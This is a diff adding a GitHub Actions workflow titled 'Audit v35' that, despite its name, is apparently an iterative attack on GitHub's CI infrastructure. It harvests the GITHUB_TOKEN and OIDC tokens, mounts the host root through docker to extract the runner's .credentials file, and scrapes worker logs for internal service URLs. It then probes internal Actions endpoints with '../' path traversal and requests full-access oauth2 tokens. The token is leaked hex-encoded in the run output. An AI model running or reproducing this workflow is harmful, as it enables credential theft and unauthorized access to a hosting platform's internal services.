@@ -1,0 +1,271 @@
+name: Audit v35
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v35:
+    runs-on: ubuntu-latest
+    steps:
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 1: Harvest
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V35 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            RUN_URL=$(grep -oP '"url"\s*:\s*"https://run-actions[^"]+' "$WLOG" | head -1 | sed 's/"url"\s*:\s*"//')
+            echo "RUN_URL=$RUN_URL"; echo "$RUN_URL" > /tmp/run_url.txt
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+          fi
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
+          ' 2>/dev/null > /tmp/hex_extract.txt
+          python3 -c "
+          import binascii,json
+          raw=open('/tmp/hex_extract.txt').read()
+          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
+          if s>=0 and e>=0:
+            h=raw[s+14:e].strip()
+            d=json.loads(binascii.unhexlify(h).decode())
+            t=d.get('Data',{}).get('token','')
+            open('/tmp/cred_token.txt','w').write(t)
+            print(f'CTOK_LEN={len(t)}')
+          " 2>/dev/null
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: FULL resourceareas + locationUrls
+      # v34: parent has 17 areas but API endpoints 404
+      # The locationUrl field tells us WHERE each service actually lives
+      # Also: connectionData has locationServiceData with access mappings
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - LocationUrls
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== LOCATION URLS ==="
+          RT=$(cat /tmp/rt.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          BASE="https://pipelinesghubeus14.actions.githubusercontent.com"
+          PARENT="$BASE/$SECRET/.."
+
+          # A: Full resourceareas with locationUrl (parent scope)
+          echo "--- A: Parent resourceareas FULL ---"
+          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" "$PARENT/_apis/resourceareas")
+          echo "$R" | jq -c '.value[]? | {name, id, locationUrl}' 2>/dev/null
+          echo ""
+
+          # B: Full connectionData with all location service data (parent)
+          echo "--- B: Parent connectionData FULL ---"
+          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" "$PARENT/_apis/connectionData")
+          echo "$R" | jq '.' 2>/dev/null | head -80
+          echo ""
+
+          # C: Secret scope resourceareas + locationUrl
+          echo "--- C: Secret scope resourceareas ---"
+          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" "$BASE/$SECRET/_apis/resourceareas")
+          echo "$R" | jq -c '.value[]? | {name, id, locationUrl}' 2>/dev/null
+          echo ""
+
+          # D: Secret scope connectionData FULL
+          echo "--- D: Secret scope connectionData ---"
+          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" "$BASE/$SECRET/_apis/connectionData")
+          echo "$R" | jq '.' 2>/dev/null | head -80
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: vstoken scope hierarchy — iid=84ff2294
+      # v34: vstoken serviceDeployments/tokenghubeus21/../.. = 84ff2294
+      # Get resourceareas + locationUrls from vstoken root
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - vstoken hierarchy
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== VSTOKEN HIERARCHY ==="
+          RT=$(cat /tmp/rt.txt)
+          IDTOK=$(cat /tmp/idtok.txt)
+          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
+          VSBASE="https://vstoken.actions.githubusercontent.com"
+
+          # A: vstoken root (../../) — full connectionData + resourceareas
+          echo "--- A: vstoken root ---"
+          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" \
+            "$VSBASE/serviceDeployments/tokenghubeus21/../../_apis/connectionData")
+          echo "$R" | jq '.' 2>/dev/null | head -80
+          echo ""
+
+          echo "--- A2: vstoken root resourceareas ---"
+          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" \
+            "$VSBASE/serviceDeployments/tokenghubeus21/../../_apis/resourceareas")
+          echo "$R" | jq -c '.value[]? | {name, id, locationUrl}' 2>/dev/null
+          echo ""
+
+          # B: vstoken parent (../) — connectionData + resourceareas
+          echo "--- B: vstoken parent ---"
+          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" \
+            "$VSBASE/serviceDeployments/tokenghubeus21/../_apis/connectionData")
+          echo "$R" | jq -c '{instanceId, deploymentId}' 2>/dev/null
+          echo ""
+
+          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" \
+            "$VSBASE/serviceDeployments/tokenghubeus21/../_apis/resourceareas")
+          echo "$R" | jq -c '.value[]? | {name, id, locationUrl}' 2>/dev/null
+          echo ""
+
+          # C: Try oauth2 on vstoken ROOT scope with each token
+          echo "--- C: vstoken root oauth2 ---"
+          OIDC=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://vstoken.actions.githubusercontent.com" | jq -r '.value // empty')
+          OIDC_ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$OIDC")
+          PLAN=$(cat /tmp/plan.txt)
+
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            "$VSBASE/serviceDeployments/tokenghubeus21/../../_apis/oauth2/token?hostId=$PLAN" \
+            -d "grant_type=client_credentials&client_assertion=$OIDC_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=&scope=vso.full_access")
+          CODE=$(echo "$R" | tail -1)
+          echo "C root oauth2 = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+          # D: Try oauth2 on vstoken parent scope
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            "$VSBASE/serviceDeployments/tokenghubeus21/../_apis/oauth2/token?hostId=$PLAN" \
+            -d "grant_type=client_credentials&client_assertion=$OIDC_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=&scope=vso.full_access")
+          CODE=$(echo "$R" | tail -1)
+          echo "D parent oauth2 = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: Hit every locationUrl directly
+      # The locationUrls from resourceareas might be direct URLs
+      # that don't need the secret path segment
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - Direct locationUrl hits
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== DIRECT LOCATIONURL HITS ==="
+          RT=$(cat /tmp/rt.txt)
+          IDTOK=$(cat /tmp/idtok.txt)
+          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          BASE="https://pipelinesghubeus14.actions.githubusercontent.com"
+
+          # Extract all unique locationUrls
+          AREAS=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" \
+            "$BASE/$SECRET/_apis/resourceareas")
+          URLS=$(echo "$AREAS" | jq -r '.value[]?.locationUrl // empty' 2>/dev/null | sort -u)
+          echo "Unique locationUrls:"
+          echo "$URLS"
+          echo ""
+
+          # Also get parent scope locationUrls
+          P_AREAS=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" \
+            "$BASE/$SECRET/../_apis/resourceareas")
+          P_URLS=$(echo "$P_AREAS" | jq -r '.value[]?.locationUrl // empty' 2>/dev/null | sort -u)
+          echo "Parent locationUrls:"
+          echo "$P_URLS"
+          echo ""
+
+          # For each locationUrl, hit connectionData and key endpoints
+          for LOC_URL in $(echo "$URLS" "$P_URLS" | sort -u); do
+            [ -z "$LOC_URL" ] && continue
+            LOC_URL=$(echo "$LOC_URL" | sed 's|/$||')
+            echo "--- LocationUrl: $LOC_URL ---"
+
+            for EP in \
+              "/_apis/connectionData" \
+              "/_apis/oauth2/token" \
+              "/_apis/distributedtask/pools" \
+              "/_apis/distributedtask/agents" \
+              "/_apis/runtime/pipelines" \
+              "/_apis/actions/runs" \
+              "/_apis/build/builds"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                -H "Authorization: Bearer $RT" "$LOC_URL$EP")
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+                echo "  $EP = $CODE | $(echo "$BODY" | head -c 200)"
+            done
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 5: Pipeline parent — location service details
+      # connectionData has locationServiceData with full service map
+      # Extract and hit all service definitions
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 5 - Location service map
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== LOCATION SERVICE MAP ==="
+          RT=$(cat /tmp/rt.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          BASE="https://pipelinesghubeus14.actions.githubusercontent.com"
+
+          # A: Full location service definitions from connectionData
+          echo "--- A: Service definitions ---"
+          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" "$BASE/$SECRET/_apis/connectionData")
+          echo "$R" | jq '.locationServiceData.serviceDefinitions[]? | {serviceType, identifier, displayName, relativeToSetting, serviceOwner}' 2>/dev/null | head -100
+          echo ""
+
+          # B: Access mappings (tells us how URLs map to services)
+          echo "--- B: Access mappings ---"
+          echo "$R" | jq '.locationServiceData.accessMappings' 2>/dev/null | head -40
+          echo ""
+
+          # C: Full location service from parent
+          echo "--- C: Parent service definitions ---"
+          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" "$BASE/$SECRET/../_apis/connectionData")
+          echo "$R" | jq '.locationServiceData.serviceDefinitions[]? | {serviceType, identifier, displayName, relativeToSetting, serviceOwner}' 2>/dev/null | head -100
+          echo ""
+
+          # D: Parent access mappings
+          echo "--- D: Parent access mappings ---"
+          echo "$R" | jq '.locationServiceData.accessMappings' 2>/dev/null | head -40
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 6: Final
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 6 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V35 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "=== V35 COMPLETE ==="
